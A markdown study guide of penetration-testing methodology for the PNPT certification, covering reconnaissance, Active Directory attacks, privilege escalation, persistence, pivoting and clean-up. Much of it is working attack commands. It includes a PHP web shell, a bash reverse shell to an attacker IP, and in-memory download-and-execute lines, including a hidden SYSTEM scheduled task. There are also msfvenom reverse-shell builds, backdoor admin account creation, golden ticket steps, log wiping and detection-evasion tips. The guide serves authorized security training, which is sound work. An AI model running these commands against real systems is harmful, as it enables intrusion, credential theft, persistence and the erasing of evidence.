# Enhanced PNPT Exam Methodology Guide

## Table of Contents
1. [Exam Strategy](#exam-strategy)
2. [Quick Reference](#quick-reference)
   - [Network Ports & Protocols](#network-ports--protocols)
   - [Common Tools](#common-tools)
   - [Hash Types](#hash-types)
3. [Pre-Engagement Preparation](#pre-engagement-preparation)
   - [Environment Setup](#environment-setup)
   - [Tool Verification](#tool-verification)
4. [Information Gathering](#information-gathering)
   - [Passive Reconnaissance](#passive-reconnaissance)
   - [Active Reconnaissance](#active-reconnaissance)
5. [Network Discovery & Enumeration](#network-discovery--enumeration)
   - [Initial Network Mapping](#initial-network-mapping)
   - [Service Enumeration](#service-enumeration)
6. [Initial Access Vectors](#initial-access-vectors)
   - [Network Attacks](#network-attacks)
   - [Web Application Attacks](#web-application-attacks)
7. [Post-Exploitation](#post-exploitation)
   - [Linux Systems](#linux-systems)
   - [Windows Systems](#windows-systems)
8. [Active Directory Attacks](#active-directory-attacks)
   - [Initial Attack Vectors](#initial-attack-vectors)
   - [Post-Compromise Enumeration](#post-compromise-enumeration)
   - [Post-Compromise Attacks](#post-compromise-attacks)
9. [Privilege Escalation](#privilege-escalation)
   - [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Windows Privilege Escalation](#windows-privilege-escalation)
10. [Lateral Movement](#lateral-movement)
    - [Network Pivoting](#network-pivoting)
    - [Credential Reuse](#credential-reuse)
11. [Clean-up & Documentation](#clean-up--documentation)
    - [System Cleanup](#system-cleanup)
    - [Documentation Requirements](#documentation-requirements)

## Exam Strategy

### Time Management
- Allocate first 30-60 minutes for initial enumeration
- Run longer scans in background while performing manual enumeration
- Document everything in real-time
- If stuck for >30 minutes, move to a different approach

### Quick Wins Checklist
1. Default credentials on web interfaces
2. Anonymous FTP access
3. Weak password policies
4. Misconfigured network shares
5. Known CVEs for discovered services

### Attack Prerequisites Checklist
- Network connectivity to target
- Required tools installed and tested
- Proper documentation setup
- Methodology ready for reference

## Quick Reference

### Network Ports & Protocols

#### Critical TCP Ports
- 21: FTP (File Transfer Protocol)
- 22: SSH (Secure Shell)
- 23: Telnet
- 25: SMTP (Simple Mail Transfer Protocol)
- 80: HTTP
- 110: POP3
- 139, 445: SMB (Server Message Block)
- 443: HTTPS
- 3306: MySQL
- 3389: RDP (Remote Desktop Protocol)
- 5985, 5986: WinRM

#### Critical UDP Ports
- 53: DNS
- 67,68: DHCP
- 69: TFTP
- 161: SNMP
- 389: LDAP (also TCP)

### Common Tools

#### Network Discovery
```bash
# Step 1: Host Discovery
sudo netdiscover -r <target-range>  # ARP scanning
sudo arp-scan -l                    # Local network scan

# Step 2: Quick Port Discovery
# Use --min-rate for faster scanning but be careful of network stability
nmap -T4 -p- --min-rate=1000 --max-retries=3 <target-ip>

# Step 3: Detailed Service Enumeration
# Only scan discovered ports to save time
nmap -T4 -A -p <discovered-ports> <target-ip>

# Step 4: UDP Scan Critical Ports
# Focus on commonly exploitable UDP services
nmap -sU -T4 -p 53,69,161,162,137,138,445 <target-ip>
```

IMPORTANT NOTES:
- Always monitor scan impact
- Adjust timing (-T4) if scans are missing ports
- Consider target stability before aggressive scanning
- Document every open port and service version


#### Web Enumeration
```bash
# Directory Discovery
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Virtual Host Discovery
ffuf -u http://<target> -H "Host: FUZZ.<domain>" -w subdomains.txt

# Basic Vulnerability Scan
nikto -h http://<target>
```

### Hash Types

#### Hashcat Modes
```bash
# Common Hash Types
hashcat -m 0    # MD5
hashcat -m 100  # SHA1
hashcat -m 1000 # NTLM
hashcat -m 5600 # NetNTLMv2
hashcat -m 13100 # Kerberos TGS-REP
hashcat -m 18200 # Kerberos AS-REP

# Example Usage
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

## Pre-Engagement Preparation

### Environment Setup
```bash
# Update System
sudo apt update && sudo apt upgrade -y

# Create Working Directory
mkdir -p ~/pentest/{recon,enum,exploit,loot}

# Tool Installation
sudo apt install -y \
  nmap \
  ffuf \
  responder \
  crackmapexec \
  bloodhound \
  python3-pip

# Clone Additional Tools
cd /opt
sudo git clone https://github.com/carlospolop/PEASS-ng.git
sudo git clone https://github.com/PowerShellMafia/PowerSploit.git
```

### Tool Verification
```bash
# Verify Critical Tools
which nmap ffuf responder crackmapexec bloodhound
searchsploit -u  # Update exploitdb database
```

## Information Gathering

### Passive Reconnaissance

#### Email Enumeration
```bash
# Tools & Websites
- hunter.io
- phonebook.cz
- clearbit connect (Chrome extension)
- tools.verifyemailaddress.io
```

#### Breach Data Collection
```bash
# Tools
- breach-parse
- dehashed.com
- haveibeenpwned.com

# Common Search Patterns
- Email -> username patterns
- Email -> password patterns
- Password -> different usernames
- Username -> email variations
```

#### Subdomain Enumeration
```bash
# Multiple Tools Approach
assetfinder --subs-only domain.com
subfinder -d domain.com
amass enum -d domain.com

# Verify Live Hosts
cat subdomains.txt | httprobe -s -p https:443 | \
  sed 's/https\?:\/\///' | tr -d ':443' > live_hosts.txt

# Certificate Transparency
curl -s "https://crt.sh/?q=%25.domain.com&output=json" | jq .
```

See Automation Script at: [OSINT Exam Guide - Automation Script](./OSINT%20Exam%20Guide.md#automation-script)

#### Google Dorks
```bash
# Common Dorks
site:domain.com filetype:pdf
site:domain.com -www
inurl:admin site:domain.com
intitle:"index of" site:domain.com
site:domain.com password
```

### Active Reconnaissance

#### Initial Network Mapping
```bash
# Host Discovery
sudo netdiscover -r <target-range>
sudo arp-scan --localnet

# Quick Port Discovery
nmap -T4 -p- --min-rate=1000 --max-retries=3 <target-ip>

# Detailed Service Enumeration
nmap -T4 -A -p <discovered-ports> <target-ip>

# SMB Signing Check
nmap --script=smb2-security-mode.nse -p445 <target-range> -Pn
```

## Network Discovery & Enumeration

### Service Enumeration

#### SMB Enumeration
```bash
# List Shares
smbclient -L \\\\<target-ip>\\ -N

# Connect to Share
smbclient \\\\<target-ip>\\<share-name>

# CrackMapExec Enumeration
crackmapexec smb <target-ip> --shares
crackmapexec smb <target-ip> --users
crackmapexec smb <target-ip> --groups

# Check Vulnerabilities
nmap --script smb-vuln* -p 445 <target-ip>
```

#### FTP Enumeration
```bash
# Anonymous Access
ftp <target-ip>
Username: anonymous
Password: anonymous

# Download All Files
prompt off
mget *

# Brute Force
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
```

#### Web Service Enumeration
```bash
# Technology Identification
whatweb -a 3 http://<target>

# Directory Discovery
ffuf -u http://<target>/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -e .php,.txt,.html \
  -c

# Parameter Discovery
ffuf -u http://<target>/page.php?FUZZ=test \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt

# Virtual Host Discovery
ffuf -u http://<target> \
  -H "Host: FUZZ.<domain>" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

Manual Checks (Priority Order):
1. robots.txt and sitemap.xml
2. Source code review
3. Client-side scripts
4. Error messages
5. Default credentials
6. File upload functionality
7. Input fields for injection

#### Jenkins Enumeration
```bash
# Basic Checks
- Default credentials (admin:admin)
- Script console access
- Build history
- Workspace contents

# Common Vulnerabilities
searchsploit jenkins
msfconsole -q -x "search jenkins"

# Brute Force
hydra -L users.txt -P passes.txt http-post-form://<target>:8080/j_acegi_security_check...
```

### NFS Enumeration
```bash
# List Mounts
showmount -e <target-ip>

# Mount Share
mkdir /mnt/nfs
mount -t nfs <target-ip>:/share /mnt/nfs
```

## Initial Access Vectors

### Network Attacks

#### LLMNR/NBT-NS Poisoning
```bash
# Step 1: Start Responder
sudo responder -I tun0 -dwPv

# Step 2: Wait for hashes (common trigger events):
# - File share access
# - Printer connection
# - Web requests

# Step 3: Hash Cracking
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

IMPORTANT NOTES:
- Run in short bursts to avoid detection
- Monitor network impact
- Document captured hashes

#### SMB Relay
```bash
# Disable SMB and HTTP in Responder
vim /etc/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# Find Targets without SMB Signing
nmap --script=smb2-security-mode.nse -p445 <target-range> -Pn

# Setup Relay
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Interactive Shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute Command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

#### IPv6 DNS Takeover Attack
Prerequisites:
- IPv6 enabled on network (but not properly configured)
- Network access
- Domain environment

```bash
# Setup ntlmrelayx for IPv6 attack
sudo ntlmrelayx.py -6 -t ldaps://DC-IP -wh fakewpad.domain.local -l lootme

# Run mitm6 (in separate terminal)
sudo mitm6 -d domain.local
```

OPERATIONAL NOTES:
- Only run in 5-10 minute intervals
- Can cause network disruption if left running
- Monitor for authentication events
- Check lootme directory for extracted data
- Watch for new admin account creation

ATTACK CHAIN:
1. Attacker machine becomes IPv6 DNS server
2. Victim requests IPv6 DNS
3. Attacker provides malicious WPAD config
4. Victim authenticates via NTLM
5. Authentication relayed to DC via LDAP
6. Domain data extracted or account created

BEST PRACTICES:
- Test impact before full deployment
- Document all created accounts
- Monitor network stability
- Have backup attack paths ready
- Clean up artifacts after testing

### Web Application Attacks

#### SQL Injection
Prerequisites:
- Injectable parameter identified
- Database error messages (optional)

Manual Testing:
```sql
-- Basic Tests
' OR '1'='1
" OR "1"="1
1 OR 1=1

-- Union Based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- Blind Boolean
' AND 1=1--
' AND 1=2--

-- Time Based
' AND (SELECT SLEEP(5))--
' AND IF(1=1,SLEEP(5),0)--
```

Automated Testing:
```bash
# Basic SQLMap
sqlmap -u "http://target/page.php?id=1" --batch

# With request file
sqlmap -r request.txt --batch --random-agent

# Database dump
sqlmap -u "http://target/page.php?id=1" --batch --dump
```

#### File Upload Bypasses
Prerequisites:
- Upload functionality
- Understanding of server-side filtering

Bypass Techniques:
1. Extension Tricks:
   ```
   shell.php.jpg
   shell.php%00.jpg
   shell.php....
   shell.php;.jpg
   ```

2. Content-Type Modification:
   ```http
   Content-Type: image/jpeg
   ```

3. Magic Bytes:
   ```bash
   # Add PHP magic bytes
   echo -e "\xFF\xD8\xFF\xE0" > shell.php
   cat legit.jpg shell.php > malicious.jpg
   ```
Payload Examples
```php
<?php system($_GET['cmd']); ?>
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'");?>
```

### Metasploit Usage

#### Basic Operations
```bash
# Start Console
msfconsole -q

# Search Modules
search type:exploit platform:windows smb
search type:auxiliary scanner

# Use Module
use exploit/windows/smb/psexec
use auxiliary/scanner/smb/smb_version

# Show Options
show options
show targets
show payloads
```

#### Common Modules
```bash
# SMB Modules
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use exploit/windows/smb/psexec

# Web Modules
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/brute_dirs
use exploit/multi/http/jenkins_script_console

# Other Useful Modules
use post/windows/gather/hashdump
use post/linux/gather/hashdump
use post/multi/recon/local_exploit_suggester
```

#### Payload Generation
```bash
# List Payloads
msfvenom -l payloads

# Windows Reverse Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<attacker-ip> \
  LPORT=<port> \
  -f exe \
  -o shell.exe

# Linux Reverse Shell
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<attacker-ip> \
  LPORT=<port> \
  -f elf \
  -o shell.elf
```

## Post-Exploitation

### Linux Systems

#### Initial Enumeration
```bash
# System Information
whoami && id
hostname
uname -a
cat /etc/*release
ip a

# User Context
sudo -l
env
history
cat ~/.bash_history

# Network Information
netstat -tuln
ip route
cat /etc/hosts

# Running Processes
ps auxwf
pstree -p

# Scheduled Tasks
ls -la /etc/cron*
cat /etc/crontab
```

#### Privilege Escalation
Automated Enumeration:
```bash
# Transfer and Run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Process Monitor
# Download and run pspy
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64

# Manual Checks
find / -perm -4000 2>/dev/null
find / -type f -writable 2>/dev/null
crontab -l
ls -la /etc/cron*
```

### Windows Systems

#### Initial Enumeration
```batch
REM System Information
systeminfo
whoami /all
net user
net localgroup administrators

REM Network Information
ipconfig /all
route print
netstat -ano

REM Running Services
tasklist /v
wmic service list brief
```

#### Privilege Escalation
```batch
REM Transfer WinPEAS
certutil.exe -urlcache -f http://<attacker-ip>/winPEAS.exe winPEAS.exe

REM Execute WinPEAS
winPEAS.exe

REM Alternative: PowerUp.ps1
REM PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

COMMON PITFALLS:
- AV might block enumeration tools
- PowerShell execution policy restrictions
- Limited user privileges affecting enumeration

### Advanced Post-Exploitation Techniques

#### File Transfer Methods

##### Windows File Transfers
```batch
REM Certutil
certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt

REM PowerShell
# PowerShell WebClient
Invoke-WebRequest -Uri "http://10.10.10.10:8000/filename.txt" -OutFile "filename.txt"

# PowerShell DownloadString (execution in memory)
powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')

REM Bitsadmin (often allowed through filters)
bitsadmin /transfer mydownloadjob /download /priority normal http://10.10.10.10/file.exe C:\Users\Public\file.exe
```

##### Python HTTP Server Options
```bash
# Basic server
python3 -m http.server 80

# With SSL
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
python3 -c "
import http.server, ssl;
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler);
server.socket = ssl.wrap_socket(server.socket, certfile='./server.pem', server_side=True);
server.serve_forever()"
```

##### FTP Transfer
```bash
# On attacker (requires python3-pyftpdlib)
python3 -m pyftpdlib 21

# On victim (Windows)
ftp 10.10.10.10
> get file.txt
```

##### SMB Transfer
```bash
# On attacker
impacket-smbserver share $(pwd) -smb2support

# On victim
copy \\10.10.10.10\share\file.exe .
```

#### Maintaining Access

##### Windows Persistence
```batch
REM Create admin user
net user backup Password123! /add
net localgroup administrators backup /add

REM Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

REM Scheduled Task
schtasks /create /tn "MyTask" /tr "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.10.10.10:8080/shell.ps1'''))'" /sc onstart /ru System
```

##### Linux Persistence
```bash
# Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Create system service
cat > /etc/systemd/system/backupd.service << EOF
[Unit]
Description=Backup Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/backupd
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backupd
systemctl start backupd
```

#### Advanced Pivoting Techniques

##### SSHuttle Setup
```bash
# Basic usage (route all traffic)
sshuttle -r user@pivot_host 0.0.0.0/0 -x pivot_host

# Route specific subnet
sshuttle -r user@pivot_host 10.10.10.0/24

# With SSH key
sshuttle -r user@pivot_host 10.10.10.0/24 --ssh-cmd "ssh -i key"

# Multiple subnets
sshuttle -r user@pivot_host 10.10.10.0/24 192.168.1.0/24

# Exclude specific IPs
sshuttle -r user@pivot_host 10.10.10.0/24 -x 10.10.10.5
```

##### SSHuttle Usage Tips
- Leave sshuttle running in dedicated terminal
- Verify routing with `ip route show`
- Test connection with ping/curl
- Monitor for connection issues
- Consider using tmux/screen for persistence

##### Multi-Hop Pivoting
```bash
# SSH Config for Multi-Hop
cat ~/.ssh/config
Host pivot1
    HostName 10.10.10.10
    User admin
    IdentityFile ~/.ssh/id_rsa

Host target
    HostName 192.168.1.10
    User admin
    ProxyCommand ssh -W %h:%p pivot1

# Proxychains through Multiple Hops
# Edit /etc/proxychains4.conf
[ProxyList]
socks4 127.0.0.1 1080
socks4 127.0.0.1 1081

# Create SSH Tunnels
ssh -D 1080 user@pivot1
ssh -D 1081 -o ProxyCommand='nc -x 127.0.0.1:1080 %h %p' user@pivot2
```

#### Metasploit Pivoting
```bash
# After getting meterpreter session
run autoroute -s 10.10.10.0/24

# Start socks proxy
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 1080
run

# Use with proxychains
proxychains nmap -sT -Pn 192.168.1.1
```

#### Clean-Up Procedures

##### Windows Clean-Up
```batch
REM Remove added users
net user backup /delete

REM Clear logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

REM Remove scheduled tasks
schtasks /delete /tn "MyTask" /f

REM Clean temp files
del /f /q %temp%\*
rmdir /s /q %temp%\*
```

##### Linux Clean-Up
```bash
# Remove added users
userdel -r backup

# Clean logs
echo > /var/log/auth.log
echo > /var/log/syslog

# Remove authorized keys
rm ~/.ssh/authorized_keys

# Clean bash history
history -c
echo > ~/.bash_history

# Clean tmp files
rm -rf /tmp/*
rm -rf /var/tmp/*
```

OPERATIONAL NOTES:
1. File Transfers:
   - Always verify file integrity
   - Consider AV detection
   - Use encrypted transfers when possible
   - Clean up transferred files

2. Persistence:
   - Document all changes
   - Use minimal required privileges
   - Consider detection likelihood
   - Plan for cleanup

3. Pivoting:
   - Test connectivity before operations
   - Monitor network stability
   - Have backup pivot methods
   - Document routing changes

4. Clean-Up:
   - Maintain detailed change log
   - Verify service restoration
   - Check for leftover files
   - Confirm log cleanup
   - Test system functionality

BEST PRACTICES:
- Test methods before relying on them
- Document all changes and additions
- Keep track of created files/accounts
- Monitor system stability
- Have backup methods ready
- Clean as you go when possible

## Active Directory Attacks

### Initial Attack Vectors

#### LLMNR Poisoning
```bash
# Start Responder
sudo responder -I tun0 -dwPv

# Crack Hashes
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt -O
```

#### SMB Relay
```bash
# Step 1: Disable SMB and HTTP in Responder
vim /etc/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# Step 2: Find targets without SMB signing
nmap --script=smb2-security-mode.nse -p445 <target-range> -Pn

# Step 3: Create targets.txt with vulnerable hosts
# Step 4: Setup relay
sudo ntlmrelayx.py -tf targets.txt -smb2support

# Optional: Get interactive shell
sudo ntlmrelayx.py -tf targets.txt -smb2support -i

# Optional: Execute command
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### Post-Compromise Enumeration

#### BloodHound
```bash
# Step 1: Install and start neo4j
sudo neo4j start
# Default credentials: neo4j:neo4j

# Step 2: Start BloodHound
bloodhound

# Step 3: Collect data
bloodhound-python -d DOMAIN -u user -p password -ns DC-IP -c all

# Step 4: Import data into BloodHound
# Drag and drop .json files into interface
```

#### LDAP Enumeration:
```bash
# Detailed LDAP dump
ldapdomaindump -u 'DOMAIN\user' -p 'password' ldap://<DC-IP>

# Parse specific information
grep -i "admincount=1" domain_users.grep
```

#### PowerView
```powershell
# Import Module
Import-Module .\PowerView.ps1

# Domain Enumeration
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
```

Other tools: See the Post-Compromise Enumeration.md notes
- Plumhound
- PingCastle


### Post-Compromise Attacks

#### Kerberoasting
```bash
# Request TGS
- Ldapdomaindump
GetUserSPNs.py domain/user:pass -dc-ip IP -request

# Crack Hash
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
```

#### DCSync
```bash
# Using Secretsdump
secretsdump.py domain/user:pass@DC-IP

# Using Mimikatz
privilege::debug
lsadump::dcsync /domain:domain.local /user:krbtgt
```
#### Shell Access with PsExec
```bash
# Using psexec.py with password
psexec.py DOMAIN/username:'password'@target-ip
psexec.py marvel.local/fcastle:'Password123'@10.0.0.10

# Using psexec.py with hash
psexec.py -hashes LM:NT administrator@target-ip
psexec.py -hashes :NT administrator@target-ip  # If you only have NT hash

# Using psexec.py with domain credentials
psexec.py administrator@target-ip -hashes aad3b435b51404eeaad3b435b51404ee:hash-here

# Alternative tools (might work when psexec fails)
wmiexec.py DOMAIN/username:'password'@target-ip
wmiexec.py -hashes :NT administrator@target-ip
smbexec.py DOMAIN/username:'password'@target-ip
smbexec.py -hashes :NT administrator@target-ip
```

#### CrackMapExec Advanced Usage
```bash
# Password spraying across network
crackmapexec smb 10.0.0.0/24 -u username -p 'Password123' --continue-on-success

# Test login with hash
crackmapexec smb 10.0.0.0/24 -u administrator -H 'HASH' --continue-on-success

# Dump SAM hashes
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' --sam

# Dump LSA secrets
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' --lsa

# Get logged-in users
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' --loggedon-users

# Run PowerView commands
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' -M powerview -o COMMAND='get-netuser'

# Dump lsass memory
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' -M lsassy

# Extract credentials from local browsers
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' -M browsers

# Execute commands
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' -x 'whoami'
crackmapexec smb 10.0.0.0/24 -u administrator -p 'password' -X '$PSVersionTable'

# Check if user is admin
crackmapexec smb 10.0.0.0/24 -u username -p 'password' --local-auth --check-admin

# Map network shares
crackmapexec smb 10.0.0.0/24 -u username -p 'password' --shares

# Find specific files
crackmapexec smb 10.0.0.0/24 -u username -p 'password' -M spider_plus --share 'C$' -o PATH='C:\\Users'

# Database queries (view successful logins)
cmedb
> workspace
> proto smb
> creds
```

IMPORTANT NOTES:
- Always test commands with single target before network-wide execution
- Monitor command impact and network traffic
- Some commands may trigger antivirus/EDR
- Use --local-auth flag when targeting local accounts
- --continue-on-success is crucial for password spraying
- Results can be found in ~/.cme/logs/

#### Token Impersonation
```bash
# Using Metasploit
msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
# Set other options (RHOSTS, LHOST, etc.)
run

# In Meterpreter session
load incognito        # Load the incognito module
list_tokens -u        # List available tokens
impersonate_token MARVEL\\administrator  # Impersonate admin token
shell                 # Get a shell with the new token

# After getting DA token, create new domain admin
net user hawkeye Password1@ /add /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN

# Verify access with new account using secretsdump
secretsdump.py domain/hawkeye:Password1@@DC-IP
```

#### LNK File Attacks

##### PowerShell LNK Creation
```powershell
# Create malicious LNK file
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\attacker-ip\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

##### Using Responder
```bash
# Start Responder to capture hash
sudo responder -I eth0 -dPv

# Using netexec (updated crackmapexec) with slinky module
netexec smb 10.0.0.0/24 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=attacker-ip
```

#### GPP (Group Policy Preferences) Attacks

##### Manual Approach
```bash
# Find GPP files in SYSVOL
find / -name Groups.xml 2>/dev/null
# Look for cpassword attribute in XML files

# Decrypt GPP password
gpp-decrypt <encrypted-string-here>
```

##### Using Metasploit
```bash
msfconsole
use auxiliary/scanner/smb/smb_enum_gpp
set RHOSTS <target-range>
set SMBDomain <domain>
set SMBUser <username>
set SMBPass <password>
run
```

##### CrackMapExec GPP
```bash
# Enumerate GPP
crackmapexec smb <target-ip> -u username -p password --gpp-passwords

# With hash
crackmapexec smb <target-ip> -u username -H <HASH> --gpp-passwords
```

IMPORTANT NOTES:
1. Token Impersonation:
   - Requires local admin rights
   - Delegated tokens provide more access than impersonated tokens
   - Clean up created accounts after testing

2. LNK File Attacks:
   - Place files in commonly accessed shares
   - Monitor Responder for incoming hashes
   - Clean up LNK files after testing

3. GPP Attacks:
   - Legacy attack but still relevant
   - Check for old Group Policy objects
   - Look for both current and historical GPP passwords
   - Common in older domains that were upgraded
   - Can find passwords for:
     * Local Administrator accounts
     * Service accounts
     * Scheduled tasks
     * Drive mappings

Best Practices:
- Document all created files and accounts
- Remove artifacts after testing
- Note that some attacks may be logged
- Test in small scope before network-wide
- Consider operational security impact

#### Advanced Post-Domain Compromise Techniques

##### Kerberoasting
Prerequisites:
- Domain user account (any level)
- Network access to DC
- Service Principal Names (SPNs) exist

```bash
# Using GetUserSPNs.py
# Basic enumeration and hash request
GetUserSPNs.py domain/username:password -dc-ip DC-IP -request
GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.0.0.3 -request

# Save output to crack
GetUserSPNs.py domain/username:password -dc-ip DC-IP -request -output hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

OPERATIONAL NOTES:
- Can be executed with any domain user account
- Look for service accounts that might have high privileges
- Monitor for account lockouts during cracking
- Some service accounts might be honeypots
- Can be noisy if many requests are made quickly

##### Dumping NTDS.dit
Prerequisites:
- Domain Admin access
- Network access to DC
- Sufficient disk space for output

```bash
# Using secretsdump.py
# Dump NTDS with all hashes
secretsdump.py domain/username:'password'@DC-IP

# Dump NTDS with just NTLM hashes (smaller output)
secretsdump.py domain/username:'password'@DC-IP -just-dc-ntlm

# Using hash instead of password
secretsdump.py -hashes LM:NT domain/username@DC-IP

# Save output for offline processing
secretsdump.py domain/username:'password'@DC-IP -output ntds_dump

# Extract specific information
grep -i "administrator" ntds_dump.ntds
```

PARSING AND CRACKING:
```bash
# Extract NT hashes for cracking
cat ntds_dump.ntds | grep -v '31d6' | cut -d ':' -f 4 > nt_hashes.txt

# Crack with hashcat
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

OPERATIONAL NOTES:
- Creates a local copy of NTDS.dit - ensure sufficient space
- Can generate significant network traffic
- Consider extracting only needed hashes
- Highly detectable activity
- Clean up dump files after use
- May require multiple attempts if initial dump fails

##### Golden Ticket Attack
Prerequisites:
- krbtgt account NTLM hash
- Domain SID
- Domain name
- Target username

```bash
# Using mimikatz
# Step 1: Get krbtgt hash and domain info
privilege::debug
lsadump::lsa /inject /name:krbtgt

# Step 2: Create golden ticket
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-... /krbtgt:NTLM-hash-here /id:500 /ptt

# Step 3: Start new process with ticket
misc::cmd

# Test access
dir \\dc01\c$
PsExec64.exe \\dc01 cmd.exe
```

REQUIREMENTS GATHERING:
```bash
# Get Domain SID
whoami /user
# Look for SID format: S-1-5-21-...

# Get krbtgt hash using secretsdump
secretsdump.py domain/username:'password'@DC-IP | grep -i krbtgt
```

PERSISTENCE CHECKLIST:
1. Create backup admin account
   ```bash
   net user backupuser ComplexPass123! /add /domain
   net group "Domain Admins" backupuser /add /domain
   ```

2. Create golden ticket for long-term access
3. Document all created artifacts for cleanup

OPERATIONAL CONSIDERATIONS:
- Golden tickets persist until krbtgt password changes twice
- Highly privileged attack - can effectively own domain
- Activity may be logged and detected
- Consider operational security before using
- Clean up created accounts after testing
- Some EDR solutions may detect ticket creation
- Test access before relying on ticket for operations

DETECTION EVASION:
- Use legitimate admin account names
- Avoid excessive ticket creation
- Limit use to necessary operations
- Consider time of day for operations
- Use standard domain admin groups

GENERAL POST-DOMAIN COMPROMISE TIPS:
1. Quick Wins Search Order:
   - Kerberoasting
   - Accessible shares
   - GPP passwords
   - Token impersonation
   - Service account misconfigurations

2. No Quick Wins? Dig Deeper:
   - Run BloodHound analysis
   - Check external trusts
   - Review GPO configurations
   - Hunt for stored credentials
   - Look for misconfigured services

3. Multiple Paths Strategy:
   - Document all potential attack paths
   - Start with least privileged access
   - Maintain multiple access methods
   - Consider cleanup requirements
   - Test paths before relying on them

4. Operational Security:
   - Monitor command impact
   - Document changes made
   - Plan cleanup steps
   - Consider detection likelihood
   - Test in limited scope first
   - Keep track of created artifacts

Remember:
- Always have multiple attack paths
- Document everything for cleanup
- Consider opsec implications
- Verify access after each step
- Plan cleanup procedures

## Lateral Movement

### Network Pivoting

#### SSH Tunneling
```bash
# Local Port Forward
ssh -L local_port:target_ip:target_port user@pivot_host

# Dynamic Port Forward
ssh -D 9050 user@pivot_host

# Remote Port Forward
ssh -R remote_port:localhost:local_port user@pivot_host

# ProxyCommand for Multi-Hop
ssh -o ProxyCommand="ssh -W %h:%p user@pivot1" user@target
```

#### Proxychains
```bash
# Edit /etc/proxychains4.conf
[ProxyList]
socks4 127.0.0.1 9050

# Use with tools
proxychains nmap -sT -p80,443,445 <target>
proxychains xfreerdp /u:admin /p:pass /v:target
```

#### Metasploit Pivoting
```bash
# Add route through session
route add <target-network> <netmask> <session-id>

# Start socks proxy
use auxiliary/server/socks_proxy
set VERSION 4a
set SRVPORT 9050
run

# Use proxychains
proxychains [tool] [options]
```

### File Transfer Techniques

#### Windows Methods
```batch
REM Certutil
certutil.exe -urlcache -f http://<attacker-ip>/file.exe file.exe

REM PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>/file.exe', 'file.exe')"
Invoke-WebRequest -Uri "http://<attacker-ip>/file.exe" -OutFile "file.exe"

REM SMB
copy \\<attacker-ip>\share\file.exe .
```

#### Linux Methods
```bash
# Python HTTP Server
python3 -m http.server 80

# wget
wget http://<attacker-ip>/file

# curl
curl -O http://<attacker-ip>/file

# nc
# Receiver
nc -lvnp 1234 > file
